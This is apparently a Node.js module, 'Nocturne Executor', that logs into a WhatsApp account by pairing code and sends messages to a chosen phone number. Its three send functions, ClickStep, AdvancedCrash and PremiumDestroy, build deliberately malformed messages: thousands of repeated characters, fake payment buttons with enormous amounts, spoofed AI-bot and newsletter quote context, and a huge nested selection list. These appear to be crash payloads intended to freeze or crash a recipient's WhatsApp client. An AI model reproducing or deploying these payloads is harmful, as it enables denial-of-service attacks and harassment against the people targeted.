const { DisconnectReason, useMultiFileAuthState, makeWASocket } = require('@shennmine/baileys');
const fs = require('fs-extra');
const path = require('path');

class WhatsAppService {
    constructor() {
        this.sock = null;
        this.pairingCode = null;
        this.isConnected = false;
        this.authPath = path.join(__dirname, '../auth');
        this.phoneNumber = null;
        this.ensureAuthDir();
    }

    ensureAuthDir() {
        if (!fs.existsSync(this.authPath)) {
            fs.mkdirSync(this.authPath, { recursive: true });
        }
    }

    async initialize(phoneNumber) {
        try {
            this.phoneNumber = phoneNumber;
            const { state, saveCreds } = await useMultiFileAuthState(this.authPath);
            
            this.sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: require('pino')({ level: 'silent' }),
                browser: ['Nocturne Executor', 'Desktop', '1.0.0']
            });

            if (!state.creds?.registered) {
                this.pairingCode = await this.sock.requestPairingCode(phoneNumber);
                console.log(`Pairing code for ${phoneNumber}: ${this.pairingCode}`);
            }

            this.sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;
                
                if (connection === 'close') {
                    const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
                    console.log('Connection closed due to ', lastDisconnect?.error, ', reconnecting ', shouldReconnect);
                    
                    if (shouldReconnect) {
                        setTimeout(() => this.initialize(this.phoneNumber), 3000);
                    }
                    this.isConnected = false;
                    this.pairingCode = null;
                } else if (connection === 'open') {
                    console.log('WhatsApp connection opened successfully');
                    this.isConnected = true;
                    this.pairingCode = null;
                }
            });

            this.sock.ev.on('creds.update', saveCreds);
            
        } catch (error) {
            console.error('WhatsApp initialization error:', error);
            throw error;
        }
    }

    async requestPairingCode(phoneNumber) {
        if (this.isConnected) {
            throw new Error('WhatsApp sudah terhubung');
        }
        
        if (!phoneNumber) {
            throw new Error('Nomor telepon diperlukan untuk pairing code');
        }
        
        const cleanNumber = phoneNumber.replace(/\D/g, '');
        
        try {
            if (!this.sock) {
                await this.initialize(cleanNumber);
            }
            
            return this.pairingCode;
        } catch (error) {
            console.error('Pairing code request error:', error);
            throw error;
        }
    }

    getConnectionStatus() {
        return {
            connected: this.isConnected,
            hasPairingCode: !!this.pairingCode,
            pairingCode: this.pairingCode,
            phoneNumber: this.phoneNumber
        };
    }

    async sendMessage(target, version, customMessage) {
        if (!this.isConnected) {
            throw new Error('WhatsApp belum terhubung. Silakan masukkan kode pairing terlebih dahulu.');
        }

        try {
            let phoneNumber = target.replace(/\D/g, '');
            if (!phoneNumber.startsWith('62')) {
                if (phoneNumber.startsWith('0')) {
                    phoneNumber = '62' + phoneNumber.slice(1);
                } else {
                    phoneNumber = '62' + phoneNumber;
                }
            }
            phoneNumber += '@s.whatsapp.net';

            const messageFunctions = {
                v1: () => this.ClickStep(phoneNumber),
                v2: () => this.AdvancedCrash(phoneNumber),
                v3: () => this.PremiumDestroy(phoneNumber)
            };

            const messageFunction = messageFunctions[version] || messageFunctions.v1;
            
            await messageFunction();
            
            return {
                success: true,
                message: 'Pesan berhasil dikirim',
                target: phoneNumber,
                version: version,
                sentAt: new Date().toISOString()
            };
            
        } catch (error) {
            console.error('Send message error:', error);
            return {
                success: false,
                message: `Gagal mengirim pesan: ${error.message}`
            };
        }
    }

// ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ

    async ClickStep(target) {
        await this.sock.sendMessage(target, {
            text: '7ooModdss⃯' + "ꦽ".repeat(5000),
            contextInfo: {
                participant: target,
                remoteJid: "X",
                stanzaId: "12345678",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: Date.now() + 1814400000
                    },
                    forwardedAiBotMessageInfo: {
                        botName: "Meta AI",
                        botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                        creatorName: "AI"
                    }
                }
            },
            interactiveMessage: {
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'review_and_pay',
                            buttonParamsJson: JSON.stringify({
                                currency: 'XOF',
                                payment_configuration: [],
                                payment_type: [],
                                total_amount: {
                                    value: '999999999',
                                    offset: '100'
                                },
                                reference_id: `StX`,
                                type: 'physical-goods',
                                payment_method: [],
                                payment_status: 'captured',
                                payment_timestamp: Math.floor(Date.now() / 1000),
                                order: {
                                    status: 'payment_requested',
                                    description: 'Nocturne Executor v1 - 7ooModdss',
                                    subtotal: {
                                        value: '999999999',
                                        offset: '100'
                                    }
                                }
                            })
                        }
                    ]
                }
            }
        });
    }

    async AdvancedCrash(target) {
        await this.sock.sendMessage(target, {
            text: '🚀 Nocturne Executor v2.0\n' + "⚡".repeat(3000),
            contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                stanzaId: Math.random().toString(36),
                quotedMessage: {
                    listResponseMessage: {
                        title: "Nocturne Advanced",
                        listType: 2,
                        singleSelectReply: {
                            selectedRowId: "crash_v2"
                        },
                        contextInfo: {
                            forwardedAiBotMessageInfo: {
                                botName: "Nocturne AI",
                                botJid: "0@s.whatsapp.net",
                                creatorName: "7ooModdss"
                            }
                        }
                    }
                }
            },
            interactiveMessage: {
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_copy',
                            buttonParamsJson: JSON.stringify({
                                display_text: "Copy Advanced Code",
                                copy_code: "NOCTURNE_V2_" + "X".repeat(10000)
                            })
                        },
                        {
                            name: 'review_and_pay',
                            buttonParamsJson: JSON.stringify({
                                currency: 'USD',
                                payment_configuration: ['manual_review'],
                                total_amount: {
                                    value: '999999999999',
                                    offset: '100'
                                },
                                reference_id: 'NOCTURNE_V2',
                                type: 'digital-goods',
                                order: {
                                    status: 'processing',
                                    description: 'Advanced Nocturne System',
                                    subtotal: {
                                        value: '999999999999',
                                        offset: '100'
                                    }
                                }
                            })
                        }
                    ]
                }
            }
        });
    }

    async PremiumDestroy(target) {
        await this.sock.sendMessage(target, {
            text: '⭐ PREMIUM NOCTURNE EXECUTOR v3.0 ⭐\n' + 
                  '🔥'.repeat(2000) + '\n' +
                  '7ooModdss Premium System\n' +
                  "💎".repeat(4000),
            contextInfo: {
                participant: target,
                remoteJid: "newsletter@newsletter.whatsapp.net",
                stanzaId: "PREMIUM_" + Date.now(),
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "120363025343298860@newsletter",
                        newsletterName: "Nocturne Premium",
                        jpegThumbnail: null,
                        caption: "Premium Access Granted",
                        inviteExpiration: Date.now() + 31536000000
                    },
                    forwardedAiBotMessageInfo: {
                        botName: "Nocturne Premium AI",
                        botJid: Math.floor(Math.random() * 9999999) + "@s.whatsapp.net",
                        creatorName: "7ooModdss Premium"
                    }
                }
            },
            interactiveMessage: {
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'single_select',
                            buttonParamsJson: JSON.stringify({
                                title: "Premium Features",
                                sections: Array.from({length: 50}, (_, i) => ({
                                    title: `Premium Option ${i + 1}`,
                                    rows: Array.from({length: 10}, (_, j) => ({
                                        header: `Feature ${j + 1}`,
                                        title: "X".repeat(1000),
                                        description: "PREMIUM".repeat(500),
                                        id: `premium_${i}_${j}`
                                    }))
                                }))
                            })
                        },
                        {
                            name: 'review_and_pay',
                            buttonParamsJson: JSON.stringify({
                                currency: 'EUR',
                                payment_configuration: ['premium', 'instant'],
                                payment_type: ['premium_subscription'],
                                total_amount: {
                                    value: '99999999999999',
                                    offset: '100'
                                },
                                reference_id: 'NOCTURNE_PREMIUM_V3',
                                type: 'premium-service',
                                payment_method: ['premium_wallet'],
                                payment_status: 'premium_active',
                                payment_timestamp: Math.floor(Date.now() / 1000),
                                order: {
                                    status: 'premium_processing',
                                    description: 'Premium Nocturne Executor v3.0 - Unlimited Power',
                                    subtotal: {
                                        value: '99999999999999',
                                        offset: '100'
                                    },
                                    tax: {
                                        value: '9999999999',
                                        offset: '100'
                                    },
                                    discount: {
                                        value: '0',
                                        offset: '100'
                                    }
                                }
                            })
                        }
                    ]
                }
            }
        });
    }
}

module.exports = WhatsAppService;